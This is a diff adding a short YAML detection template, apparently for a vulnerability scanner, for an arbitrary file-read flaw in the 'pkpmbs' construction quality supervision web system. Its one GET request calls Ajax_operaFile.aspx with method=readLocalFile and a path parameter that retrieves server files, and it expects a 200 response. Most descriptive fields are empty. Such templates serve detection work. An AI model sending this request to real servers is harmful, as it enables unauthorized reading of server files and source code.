@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: pkpmbs建设工程质量监督系统 Ajax_operaFile.aspx 文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /Applications/BaseInfos/System/Ajax_operaFile.aspx?method=readLocalFile&path=/Applications/BaseInfos/System/Ajax_operaFile.aspx
+response1:
+  headers:
+  body:
+  code: 200
+requests2:
+response2:
